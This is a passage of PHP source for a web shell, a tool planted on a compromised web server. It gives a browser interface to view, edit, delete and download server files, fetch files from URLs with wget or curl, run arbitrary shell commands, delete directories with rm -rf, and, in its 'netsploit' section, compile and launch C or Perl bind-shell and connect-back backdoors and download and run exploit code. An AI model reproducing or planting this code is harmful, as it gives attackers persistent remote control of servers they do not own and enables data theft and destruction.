				<td>".date("d-M-Y H:i",@fileatime($file))."</td>
			</tr> 
			<tr>
				<td>Actions</td>
				<td><a href=\"?y=$pwd&amp;edit=$file\">edit</a> 
					| <a href=\"javascript:tukar('".clearspace($filn)."_link','".clearspace($filn)."_form');\">rename</a> 
					| <a href=\"?y=$pwd&amp;delete=$file\">delete</a> 
					| <a href=\"?y=$pwd&amp;dl=$file\">download</a>&nbsp;(<a href=\"?y=$pwd&amp;dlgzip=$file\">gz</a>)
				</td>
			</tr> 
			<tr>
				<td>View</td>
				<td><a href=\"?y=".$pwd."&amp;view=".$file."\">text</a> 
					| <a href=\"?y=".$pwd."&amp;view=".$file."&amp;type=code\">code</a> 
					| <a href=\"?y=".$pwd."&amp;view=".$file."&amp;type=image\">img</a>
				</td>
			</tr> 
		</table> "; 
		if(isset($_GET['type']) && ($_GET['type']=='image'))
			{ echo "<div style=\"text-align:center;margin:8px;\"><img src=\"?y=".$pwd."&amp;img=".$filn."\"></div>"; } 
		elseif(isset($_GET['type']) && ($_GET['type']=='code'))
			{ echo "<div class=\"viewfile\">"; $file = wordwrap(@file_get_contents($file),"240","\n"); @highlight_string($file); echo "</div>"; } 
		else 	{ echo "<div class=\"viewfile\">"; echo nl2br(htmlentities((@file_get_contents($file)))); echo "</div>"; } 
		} 
	elseif(is_dir($_GET['view'])){ echo showdir($pwd,$prompt); } 
	} 

elseif(isset($_GET['edit']) && ($_GET['edit'] != ""))
	{ 
	if(isset($_POST['save']))
		{ 
		$file = $_POST['saveas']; 
		$content = magicboom($_POST['content']); 
		if($filez = @fopen($file,"w"))
			{ 
			$time = date("d-M-Y H:i",time()); 
			if(@fwrite($filez,$content)) $msg = "file saved <span class=\"gaya\">@</span> ".$time; 
			else $msg = "failed to save"; @fclose($filez); 
			} 
		else $msg = "permission denied"; 
		} 
	if(!isset($file)) $file = $_GET['edit']; 
	if($filez = @fopen($file,"r"))
		{ 
		$content = ""; 
		while(!feof($filez))
			{ 
			$content .= htmlentities(str_replace("''","'",fgets($filez))); 
			} 
		@fclose($filez); 
		} ?> 
	<form action="?y=<?php echo $pwd; ?>&amp;edit=<?php echo $file; ?>" method="post">
		<table class="cmdbox"> 
			<tr>
				<td colspan="2"> 
				<textarea class="output" name="content"><?php echo $content; ?></textarea> 
				</td>
			<tr>
				<td colspan="2">Save as <input onMouseOver="this.focus();" id="cmd" class="inputz" type="text" name="saveas" style="width:60%;" value="<?php echo $file; ?>" />
				<input class="inputzbut" type="submit" value="Save !" name="save" style="width:12%;" /> &nbsp;<?php echo $msg; ?>
				</td>
			</tr> 
		</table> 
	</form> 
<?php 
	} 

elseif(isset($_GET['x']) && ($_GET['x'] == 'upload'))
	{ 
	if(isset($_POST['uploadcomp']))
		{ 
		if(is_uploaded_file($_FILES['file']['tmp_name']))
			{ 
			$path = magicboom($_POST['path']); 
			$fname = $_FILES['file']['name']; 
			$tmp_name = $_FILES['file']['tmp_name']; 
			$pindah = $path.$fname; 
			$stat = @move_uploaded_file($tmp_name,$pindah); 
			if ($stat) { $msg = "file uploaded to $pindah"; } 
			else $msg = "failed to upload $fname"; 
			} 
		else $msg = "failed to upload $fname"; 
		} 
	elseif(isset($_POST['uploadurl']))
		{ 
		$pilihan = trim($_POST['pilihan']); 
		$wurl = trim($_POST['wurl']); 
		$path = magicboom($_POST['path']); 
		$namafile = download($pilihan,$wurl); 
		$pindah = $path.$namafile; 
		if(is_file($pindah)) { $msg = "file uploaded to DIR $pindah"; } 
		else $msg = "failed ! to upload $namafile"; } 
	?> 
	<form action="?y=<?php echo $pwd; ?>&amp;x=upload" enctype="multipart/form-data" method="post"> 
		<table class="tabnet" style="width:320px;padding:0 1px;"> 
			<tr>
				<th colspan="2">Upload from computer</th>
			</tr> 
			<tr>
			
				<td colspan="2">
					<p style="text-align:center;">
					<input style="color:#7CDA89;" type="file" name="file" />
					<input type="submit" name="uploadcomp" class="inputzbut" value="Go !" style="width:80px;">
					</p>
				</td> 
			</tr>
			<tr>
				<td colspan="2">
					<input type="text" class="inputz" style="width:99%;" name="path" value="<?php echo $pwd; ?>" />
				</td>
			</tr> 
		</table>
	</form> 
	<table class="tabnet" style="width:320px;padding:0 1px;"> 
		<tr>
			<th colspan="2">Upload from url</th>
		</tr> 
		<tr>
			<td colspan="2">
				<form method="post" style="margin:0;padding:0;" actions="?y=<?php echo $pwd; ?>&amp;x=upload"> 
					<table>
						<tr>
							<td>url</td>
							<td><input class="inputz" type="text" name="wurl" style="width:250px;" value="http://www.some-code/exploits.c"></td>
						</tr> 
						<tr>
							<td colspan="2"><input type="text" class="inputz" style="width:99%;" name="path" value="<?php echo $pwd; ?>" /></td>
						</tr> 
						<tr>
							<td>
							<select size="1" class="inputz" name="pilihan"> 
								<option value="wwget">wget</option> 
								<option value="wlynx">lynx</option> 
								<option value="wfread">fread</option> 
								<option value="wfetch">fetch</option> 
								<option value="wlinks">links</option> 
								<option value="wget">GET</option> 
								<option value="wcurl">curl</option> 
							</select>
							</td>
							<td colspan="2"><input type="submit" name="uploadurl" class="inputzbut" value="Go !" style="width:246px;"></td>
						</tr>
					</table>
				</form>
			</td> 
		</tr> 
	</table> 
	<div style="text-align:center;margin:2px;"><?php echo $msg; ?></div> 
<?php } 

elseif(isset($_GET['x']) && ($_GET['x'] == 'netsploit'))
	{ 
	if (isset($_POST['bind']) && !empty($_POST['port']) && !empty($_POST['bind_pass']) && ($_POST['use'] == 'C')) 
		{ 	
		$port = trim($_POST['port']); 
		$passwrd = trim($_POST['bind_pass']); 
		tulis("bdc.c",$port_bind_bd_c); 
		exe("gcc -o bdc bdc.c"); 
		exe("chmod 777 bdc"); 
		@unlink("bdc.c"); 
		exe("./bdc ".$port." ".$passwrd." &"); 
		$scan = exe("ps aux"); 
		if(eregi("./bdc $por",$scan))
			{ 
			$msg = "<p>Process found running, backdoor setup successfully.</p>"; 
			} 
		else 
			{ 
			$msg = "<p>Process not found running, backdoor not setup successfully.</p>"; 
			} 
		} 
	elseif (isset($_POST['bind']) && !empty($_POST['port']) && !empty($_POST['bind_pass']) && ($_POST['use'] == 'Perl')) 
		{ 
		$port = trim($_POST['port']); 
		$passwrd = trim($_POST['bind_pass']); 
		tulis("bdp",$port_bind_bd_pl); 
		exe("chmod 777 bdp"); 
		$p2=which("perl"); 
		exe($p2." bdp ".$port." &"); 
		$scan = exe("ps aux"); 
		if(eregi("$p2 bdp $port",$scan))
			{ $msg = "<p>Process found running, backdoor setup successfully.</p>"; } 
		else { $msg = "<p>Process not found running, backdoor not setup successfully.</p>"; } } 
	elseif (isset($_POST['backconn']) && !empty($_POST['backport']) && !empty($_POST['ip']) && ($_POST['use'] == 'C')) 
		{ 
		$ip = trim($_POST['ip']); 
		$port = trim($_POST['backport']); 
		tulis("bcc.c",$back_connect_c); 
		exe("gcc -o bcc bcc.c"); 
		exe("chmod 777 bcc"); 
		@unlink("bcc.c"); 
		exe("./bcc ".$ip." ".$port." &"); 
		$msg = "Now script try connect to ".$ip." port ".$port." ..."; 
		} 
	elseif (isset($_POST['backconn']) && !empty($_POST['backport']) && !empty($_POST['ip']) && ($_POST['use'] == 'Perl')) 
		{ 
		$ip = trim($_POST['ip']); 
		$port = trim($_POST['backport']); 
		tulis_2("bcp",$back_connect); 
		exe("chmod +x bcp"); 
		$p2=which("perl"); 
		exe($p2." bcp ".$ip." ".$port." &"); 
		sleep(1);
		$msg = "Now script try connect to ".$ip." port ".$port." ..."; 
		unlink("bcp");
		} 
	elseif (isset($_POST['expcompile']) && !empty($_POST['wurl']) && !empty($_POST['wcmd'])) 
		{ 
		$pilihan = trim($_POST['pilihan']); 
		$wurl = trim($_POST['wurl']); 
		$namafile = download($pilihan,$wurl); 
		if(is_file($namafile)) { $msg = exe($wcmd); } else $msg = "error: file not found $namafile"; } 
	?> 
	<table class="tabnet"> 
		<tr>
			<th>Port Binding</th>
			<th>Connect Back</th>
			<th>Load and Exploit</th>
		</tr> 
		<tr> 
			<td> 
				<form method="post" actions="?y=<?php echo $pwd; ?>&amp;x=netsploit"> 
				<table> 
					<tr>
						<td>Port</td>
						<td>
						<input class="inputz" type="text" name="port" size="26" value="<?php echo $bindport ?>">
						</td>
					</tr> 
					<tr>
						<td>Password</td>
						<td><input class="inputz" type="text" name="bind_pass" size="26" value="<?php echo $bindport_pass; ?>"></td>
					</tr> 
					<tr>
						<td>Use</td>
						<td style="text-align:justify">
							<p>
							<select class="inputz" size="1" name="use">
								<option value="Perl">Perl</option>
								<option value="C">C</option>
							</select> 
							<input class="inputzbut" type="submit" name="bind" value="Bind !" style="width:120px">
						</td>
					</tr>
				</table> 
				</form> 
			</td> 
			<td> 
				<form method="post" actions="?y=<?php echo $pwd; ?>&amp;x=netsploit"> 
				<table> 
					<tr>
						<td>IP</td>
						<td>
						<input class="inputz" type="text" name="ip" size="26" value="<?php echo ((getenv('REMOTE_ADDR')) ? (getenv('REMOTE_ADDR')) : ("127.0.0.1")); ?>">
						</td>
					</tr> 
					<tr>
						<td>Port</td>
						<td>
						<input class="inputz" type="text" name="backport" size="26" value="<?php echo $bindport; ?>">
						</td>
					</tr> 
					<tr>
						<td>Use</td>
						<td style="text-align:justify">
							<p>
							<select size="1" class="inputz" name="use">
								<option value="Perl">Perl</option>
								<option value="C">C</option>
							</select> 
							<input type="submit" name="backconn" value="Connect !" class="inputzbut" style="width:120px">
						</td>
					</tr>
				</table> 
				</form> 
			</td> 
			<td> 
				<form method="post" actions="?y=<?php echo $pwd; ?>&amp;x=netsploit"> 
				<table> 
					<tr>
						<td>url</td>
						<td><input class="inputz" type="text" name="wurl" style="width:250px;" value="www.some-code/exploits.c"></td>
					</tr> 
					<tr>
						<td>cmd</td>
						<td><input class="inputz" type="text" name="wcmd" style="width:250px;" value="gcc -o exploits exploits.c;chmod +x exploits;./exploits;"></td> 
					</tr> 
					<tr>
						<td>
						<select size="1" class="inputz" name="pilihan"> 
							<option value="wwget">wget</option> 
							<option value="wlynx">lynx</option> 
							<option value="wfread">fread</option> 
							<option value="wfetch">fetch</option> 
							<option value="wlinks">links</option> 
							<option value="wget">GET</option> 
							<option value="wcurl">curl</option>
						</select>
						</td>
						<td colspan="2">
							<input type="submit" name="expcompile" class="inputzbut" value="Go !" style="width:246px;">
						</td>
					</tr>
				</table> 
				</form> 
			</td> 
		</tr> 
	</table> 
	<div style="text-align:center;margin:2px;"><?php echo $msg; ?></div> 
<?php } 

elseif(isset($_GET['x']) && ($_GET['x'] == 'shell'))
	{ 
	?> 
	<form action="?y=<?php echo $pwd; ?>&amp;x=shell" method="post"> 
		<table class="cmdbox"> 
			<tr>
				<td colspan="2"> 
				<textarea class="output" readonly> <?php if(isset($_POST['submitcmd'])) { echo @exe($_POST['cmd']); } ?> </textarea> 
				</td>
			</tr>
			<tr>
				<td colspan="2"><?php echo $prompt; ?>
				<input onMouseOver="this.focus();" id="cmd" class="inputz" type="text" name="cmd" style="width:60%;" value="" />
				<input class="inputzbut" type="submit" value="Go !" name="submitcmd" style="width:12%;" />
				</td>
			</tr> 
		</table> 
	</form> <?php 
	} 
else 
	{ 
	if(isset($_GET['delete']) && ($_GET['delete'] != ""))
		{ 
		$file = $_GET['delete']; @unlink($file); 
		} 
	elseif(isset($_GET['fdelete']) && ($_GET['fdelete'] != ""))
		{ 
		@exe('rm -rf '.$_GET['fdelete'].''); 
		} 
	elseif(isset($_GET['mkdir']) && ($_GET['mkdir'] != ""))
		{ 
		$path = $pwd.$_GET['mkdir']; @mkdir($path); 
		} 
	$buff = showdir($pwd,$prompt); 
	echo $buff; 
	} 
	?>
    
		</div> 
	</body> 
</html>